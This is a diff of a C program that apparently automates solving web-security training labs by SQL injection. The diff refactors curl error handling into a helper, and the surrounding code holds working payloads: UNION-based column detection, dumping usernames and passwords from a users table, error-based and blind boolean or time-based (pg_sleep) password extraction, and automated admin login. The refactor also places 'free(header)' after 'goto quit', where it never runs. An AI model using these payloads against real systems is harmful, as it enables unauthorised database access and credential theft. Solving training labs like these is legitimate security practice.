@@ -66,6 +66,15 @@ int extract_lab_id(const char *html_content) {
     return -1;
 }
 
+int performCurlRequest(CURL *curl) {
+    CURLcode res = curl_easy_perform(curl);
+    if (res != CURLE_OK) {
+        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+        return 1;
+    }
+    return 0;
+}
+
 
 size_t write_callback(const char *data, size_t size, size_t count, void *output_buffer) {
     size_t total_size = size * count;
@@ -166,7 +175,7 @@ void show_paas_ascii_art() {
 }
 
 
-int detect_column_count(char *url, char *response_buffer, CURLcode res, CURL *curl, char* comment_sign) {
+int detect_column_count(char *url, char *response_buffer, CURL *curl, char* comment_sign) {
     int i = 1;
     int max_attempts = 15;
     while (i < max_attempts) {
@@ -180,12 +189,8 @@ int detect_column_count(char *url, char *response_buffer, CURLcode res, CURL *cu
         curl_easy_setopt(curl, CURLOPT_URL, url);
         memset(response_buffer, 0, strlen(response_buffer));
 
-        res = curl_easy_perform(curl);
-        if (res != CURLE_OK) {
-            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
-            fprintf(stderr, "error in detect_column_count() function!");
-            return 0;
-        }
+        if (performCurlRequest(curl) != 0)
+            return -1;
         i++;
         clear_url(url);
     }
@@ -210,11 +215,8 @@ int vulnerabilities(char *url) {
         curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
         curl_easy_setopt(curl, CURLOPT_WRITEDATA, response_buffer);
 
-        res = curl_easy_perform(curl);
-        if (res != CURLE_OK) {
-            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+        if (performCurlRequest(curl) != 0)
             goto quit;
-        }
 
         int selected_lab = -1;
         selected_lab = extract_lab_id(response_buffer);
@@ -224,12 +226,9 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_URL, url);
 
             memset(response_buffer, 0, strlen(response_buffer));
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+
+            if (performCurlRequest(curl) != 0)
                 goto quit;
-            }
-            goto quit;
         }
 
         else if (selected_lab == 2) {
@@ -238,11 +237,8 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
 
             memset(response_buffer, 0, strlen(response_buffer));
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            if (performCurlRequest(curl) != 0)
                 goto quit;
-            }
 
             extract_csrf_token(response_buffer, csrf_token, 64);
 
@@ -251,27 +247,20 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
 
             memset(response_buffer, 0, strlen(response_buffer));
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            if (performCurlRequest(curl) != 0)
                 goto quit;
-            }
 
             clear_url(url);
             curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
             memset(response_buffer, 0, strlen(response_buffer));
 
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            if (performCurlRequest(curl) != 0)
                 goto quit;
-            }
-            goto quit;
         }
 
         else if (selected_lab == 3) {
             // step one - determine the number of columns
-            int i = detect_column_count(url, response_buffer, res, curl, "--");
+            int i = detect_column_count(url, response_buffer, curl, "--");
             if (i == 0)
                 goto quit;
 
@@ -292,11 +281,8 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_URL, url);
             memset(response_buffer, 0, strlen(response_buffer));
 
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            if (performCurlRequest(curl) != 0)
                 goto quit;
-            }
             clear_url(url);
 
             // step three - exploit
@@ -315,15 +301,11 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_URL, url);
             memset(response_buffer, 0, strlen(response_buffer));
 
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            if (performCurlRequest(curl) != 0)
                 goto quit;
-            }
-            goto quit;
         }
         else if (selected_lab == 4) {
-            int i = detect_column_count(url, response_buffer, res, curl, "%23");
+            int i = detect_column_count(url, response_buffer, curl, "%23");
             if (i == 0)
                 goto quit;
 
@@ -343,11 +325,8 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_URL, url);
             memset(response_buffer, 0, strlen(response_buffer));
 
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            if (performCurlRequest(curl) != 0)
                 goto quit;
-            }
             clear_url(url);
 
             // step three - exploit
@@ -367,17 +346,13 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_URL, url);
             memset(response_buffer, 0, strlen(response_buffer));
 
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            if (performCurlRequest(curl) != 0)
                 goto quit;
-            }
-            goto quit;
         }
 
         else if (selected_lab == 5) {
             // step one - determine the number of columns
-            int i = detect_column_count(url, response_buffer, res, curl, "--");
+            int i = detect_column_count(url, response_buffer, curl, "--");
             if (i == 0)
                 goto quit;
 
@@ -397,11 +372,8 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_URL, url);
             memset(response_buffer, 0, strlen(response_buffer));
 
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            if (performCurlRequest(curl) != 0)
                 goto quit;
-            }
             clear_url(url);
 
             // step three - finding the name of the table containing user credentials
@@ -425,11 +397,8 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_URL, url);
             memset(response_buffer, 0, strlen(response_buffer));
 
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            if (performCurlRequest(curl) != 0)
                 goto quit;
-            }
             clear_url(url);
 
             // step five  - finding the names of the columns containing usernames and passwords
@@ -457,11 +426,8 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_URL, url);
             memset(response_buffer, 0, strlen(response_buffer));
 
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            if (performCurlRequest(curl) != 0)
                 goto quit;
-            }
             clear_url(url);
 
             // step seven - extract administrator's password from column
@@ -475,11 +441,8 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
             memset(response_buffer, 0, strlen(response_buffer));
 
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            if (performCurlRequest(curl) != 0)
                 goto quit;
-            }
 
             extract_csrf_token(response_buffer, csrf_token, 64);
 
@@ -488,16 +451,13 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
             memset(response_buffer, 0, strlen(response_buffer));
 
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            if (performCurlRequest(curl) != 0)
                 goto quit;
-            }
         }
 
         else if (selected_lab == 6) {
             // step one - determine the number of columns
-            int i = detect_column_count(url, response_buffer, res, curl, "--");
+            int i = detect_column_count(url, response_buffer, curl, "--");
             if (i == 0)
                 goto quit;
 
@@ -517,11 +477,8 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_URL, url);
             memset(response_buffer, 0, strlen(response_buffer));
 
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            if (performCurlRequest(curl) != 0)
                 goto quit;
-            }
             clear_url(url);
 
             // step three  - finding the names of the columns containing usernames and passwords
@@ -545,11 +502,8 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_URL, url);
             memset(response_buffer, 0, strlen(response_buffer));
 
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            if (performCurlRequest(curl) != 0)
                 goto quit;
-            }
             clear_url(url);
 
             // step five  - finding the names of the columns containing usernames and passwords
@@ -576,11 +530,8 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_URL, url);
             memset(response_buffer, 0, strlen(response_buffer));
 
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            if (performCurlRequest(curl) != 0)
                 goto quit;
-            }
             clear_url(url);
 
             // step seven - extract administrator's password from column
@@ -594,11 +545,8 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
             memset(response_buffer, 0, strlen(response_buffer));
 
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            if (performCurlRequest(curl) != 0)
                 goto quit;
-            }
 
             extract_csrf_token(response_buffer, csrf_token, 64);
 
@@ -607,11 +555,8 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
             memset(response_buffer, 0, strlen(response_buffer));
 
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            if (performCurlRequest(curl) != 0)
                 goto quit;
-            }
         }
 
         else if (selected_lab == 7) {
@@ -628,15 +573,11 @@ int vulnerabilities(char *url) {
                 curl_easy_setopt(curl, CURLOPT_URL, url);
                 memset(response_buffer, 0, strlen(response_buffer));
 
-                res = curl_easy_perform(curl);
-                if (res != CURLE_OK) {
-                    fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+                if (performCurlRequest(curl) != 0)
                     goto quit;
-                }
 
-                if (strstr(response_buffer, "Internal Server Error") == NULL) {
+                if (strstr(response_buffer, "Internal Server Error") == NULL)
                     break;
-                }
 
                 i++;
                 clear_url(url);
@@ -646,7 +587,7 @@ int vulnerabilities(char *url) {
 
         else if (selected_lab == 8) {
             // step one - determine the number of columns
-            int i = detect_column_count(url, response_buffer, res, curl, "--");
+            int i = detect_column_count(url, response_buffer, curl, "--");
             if (i == 0)
                 goto quit;
 
@@ -680,11 +621,8 @@ int vulnerabilities(char *url) {
                 memset(response_buffer, 0, strlen(response_buffer));
 
 
-                res = curl_easy_perform(curl);
-                if (res != CURLE_OK) {
-                    fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+                if (performCurlRequest(curl) != 0)
                     goto quit;
-                }
                 clear_url(url);
                 strncat(sqli_payload, "/filter?category=Accessories'+UNION+SELECT+NULL", 47);
                 until_column_count++;
@@ -697,22 +635,16 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_URL, url);
             memset(response_buffer, 0, strlen(response_buffer));
 
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            if (performCurlRequest(curl) != 0)
                 goto quit;
-            }
 
             clear_url(url);
             strncat(url, "/filter?category=Accessories'+UNION+SELECT+username,+password+FROM+users--", 74);
             curl_easy_setopt(curl, CURLOPT_URL, url);
             memset(response_buffer, 0, strlen(response_buffer));
 
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+             if (performCurlRequest(curl) != 0)
                 goto quit;
-            }
 
             // extract administrator's password from column
             char admin_account_password[30] = "";
@@ -725,11 +657,8 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
             memset(response_buffer, 0, strlen(response_buffer));
 
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            if (performCurlRequest(curl) != 0)
                 goto quit;
-            }
 
             extract_csrf_token(response_buffer, csrf_token, 64);
 
@@ -738,11 +667,8 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
             memset(response_buffer, 0, strlen(response_buffer));
 
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            if (performCurlRequest(curl) != 0)
                 goto quit;
-            }
         }
 
         else if (selected_lab == 10) {
@@ -750,22 +676,16 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_URL, url);
             memset(response_buffer, 0, strlen(response_buffer));
 
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            if (performCurlRequest(curl) != 0)
                 goto quit;
-            }
 
             clear_url(url);
             strncat(url, "/filter?category=Accessories'+UNION+SELECT+NULL,username||'~'||password+FROM+users--", 84);
             curl_easy_setopt(curl, CURLOPT_URL, url);
             memset(response_buffer, 0, strlen(response_buffer));
 
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            if (performCurlRequest(curl) != 0)
                 goto quit;
-            }
 
             // extract administrator's password from column
             char admin_account_password[30] = "";
@@ -778,11 +698,8 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
             memset(response_buffer, 0, strlen(response_buffer));
 
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            if (performCurlRequest(curl) != 0)
                 goto quit;
-            }
 
             extract_csrf_token(response_buffer, csrf_token, 64);
             char post_data[512] = "";
@@ -790,11 +707,8 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
             memset(response_buffer, 0, strlen(response_buffer));
 
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            if (performCurlRequest(curl) != 0)
                 goto quit;
-            }
         }
 
         else if (selected_lab == 11) {
@@ -807,11 +721,9 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
             memset(response_buffer, 0, strlen(response_buffer));
 
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
-                free(header);
+            if (performCurlRequest(curl) != 0) {
                 goto quit;
+                free(header);
             }
 
             extract_value(header, "TrackingId=", ";", tracking_id_cookie, 11);
@@ -846,11 +758,9 @@ int vulnerabilities(char *url) {
                     curl_easy_setopt(curl, CURLOPT_COOKIE, sqli_payload);
                     memset(response_buffer, 0, strlen(response_buffer));
 
-                    res = curl_easy_perform(curl);
-                    if (res != CURLE_OK) {
-                        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
-                        free(header);
+                    if (performCurlRequest(curl) != 0) {
                         goto quit;
+                        free(header);
                     }
                     if (strstr(response_buffer, "Welcome back!") != NULL) {
                         if (character + i > 'z') {
@@ -876,11 +786,9 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
             memset(response_buffer, 0, strlen(response_buffer));
 
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
-                free(header);
+            if (performCurlRequest(curl) != 0) {
                 goto quit;
+                free(header);
             }
 
             extract_csrf_token(response_buffer, csrf_token, 64);
@@ -890,11 +798,9 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
             memset(response_buffer, 0, strlen(response_buffer));
 
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
-                free(header);
+            if (performCurlRequest(curl) != 0) {
                 goto quit;
+                free(header);
             }
             free(header);
         }
@@ -909,11 +815,9 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
             memset(response_buffer, 0, strlen(response_buffer));
 
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
-                free(header);
+            if (performCurlRequest(curl) != 0) {
                 goto quit;
+                free(header);
             }
 
             extract_value(header, "TrackingId=", ";", tracking_id_cookie, 11);
@@ -947,11 +851,9 @@ int vulnerabilities(char *url) {
                     curl_easy_setopt(curl, CURLOPT_COOKIE, sqli_payload);
                     memset(response_buffer, 0, strlen(response_buffer));
 
-                    res = curl_easy_perform(curl);
-                    if (res != CURLE_OK) {
-                        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
-                        free(header);
+                    if (performCurlRequest(curl) != 0) {
                         goto quit;
+                        free(header);
                     }
                     if (strstr(response_buffer, "Internal") != NULL) {
                         strncpy(password_temp, password, strlen(password));
@@ -963,11 +865,9 @@ int vulnerabilities(char *url) {
                     curl_easy_setopt(curl, CURLOPT_COOKIE, sqli_payload);
                     memset(response_buffer, 0, strlen(response_buffer));
 
-                    res = curl_easy_perform(curl);
-                    if (res != CURLE_OK) {
-                        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
-                        free(header);
+                    if (performCurlRequest(curl) != 0) {
                         goto quit;
+                        free(header);
                     }
                     if (strstr(response_buffer, "Internal") == NULL) {
                         left = mid + 1;
@@ -987,11 +887,9 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
             memset(response_buffer, 0, strlen(response_buffer));
 
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
-                free(header);
+            if (performCurlRequest(curl) != 0) {
                 goto quit;
+                free(header);
             }
 
             extract_csrf_token(response_buffer, csrf_token, 64);
@@ -1001,11 +899,9 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
             memset(response_buffer, 0, strlen(response_buffer));
 
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
-                free(header);
+            if (performCurlRequest(curl) != 0) {
                 goto quit;
+                free(header);
             }
             free(header);
         }
@@ -1013,11 +909,8 @@ int vulnerabilities(char *url) {
         else if (selected_lab == 13) {
             curl_easy_setopt(curl, CURLOPT_COOKIE, "TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--");
 
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            if (performCurlRequest(curl) != 0)
                 goto quit;
-            }
 
             char admin_account_password[30] = "";
             extract_value(response_buffer, "integer: ", "\"", admin_account_password, 10);
@@ -1030,11 +923,8 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
             memset(response_buffer, 0, strlen(response_buffer));
 
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            if (performCurlRequest(curl) != 0)
                 goto quit;
-            }
 
             extract_csrf_token(response_buffer, csrf_token, 64);
 
@@ -1043,21 +933,15 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
             memset(response_buffer, 0, strlen(response_buffer));
 
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            if (performCurlRequest(curl) != 0)
                 goto quit;
-            }
         }
 
         else if (selected_lab == 14) {
             curl_easy_setopt(curl, CURLOPT_COOKIE, "TrackingId=paas'||pg_sleep(10)--");
 
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            if (performCurlRequest(curl) != 0)
                 goto quit;
-            }
         }
 
         else if (selected_lab == 15) {
@@ -1070,11 +954,9 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
             memset(response_buffer, 0, strlen(response_buffer));
 
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
-                free(header);
+             if (performCurlRequest(curl) != 0) {
                 goto quit;
+                free(header);
             }
 
             extract_value(header, "TrackingId=", ";", tracking_id_cookie, 11);
@@ -1107,11 +989,9 @@ int vulnerabilities(char *url) {
                     curl_easy_setopt(curl, CURLOPT_COOKIE, sqli_payload);
                     memset(response_buffer, 0, strlen(response_buffer));
 
-                    res = curl_easy_perform(curl);
-                    if (res != CURLE_OK) {
-                        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
-                        free(header);
+                    if (performCurlRequest(curl) != 0) {
                         goto quit;
+                        free(header);
                     }
                     curl_easy_getinfo(curl, CURLINFO_TOTAL_TIME, &totalTime);
                     if (totalTime > 1.00) {
@@ -1132,11 +1012,9 @@ int vulnerabilities(char *url) {
             curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
             memset(response_buffer, 0, strlen(response_buffer));
 
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
-                free(header);
+            if (performCurlRequest(curl) != 0) {
                 goto quit;
+                free(header);
             }
 
             extract_csrf_token(response_buffer, csrf_token, 64);
@@ -1147,11 +1025,9 @@ int vulnerabilities(char *url) {
             memset(response_buffer, 0, strlen(response_buffer));
 
             sleep(2);
-            res = curl_easy_perform(curl);
-            if (res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
-                free(header);
+            if (performCurlRequest(curl) != 0) {
                 goto quit;
+                free(header);
             }
             free(header);
         }
@@ -1171,19 +1047,12 @@ int vulnerabilities(char *url) {
         curl_easy_setopt(curl, CURLOPT_URL, url);
         curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
         memset(response_buffer, 0, strlen(response_buffer));
-
-        res = curl_easy_perform(curl);
-        if (res != CURLE_OK) {
-            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+        if (performCurlRequest(curl) != 0)
             goto quit;
-        }
 
         memset(response_buffer, 0, strlen(response_buffer));
-        res = curl_easy_perform(curl);
-        if (res != CURLE_OK) {
-            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+        if (performCurlRequest(curl) != 0)
             goto quit;
-        }
 
         if (strstr(response_buffer, "Congratulations, you solved the lab!") != NULL) {
             return_value = 0;
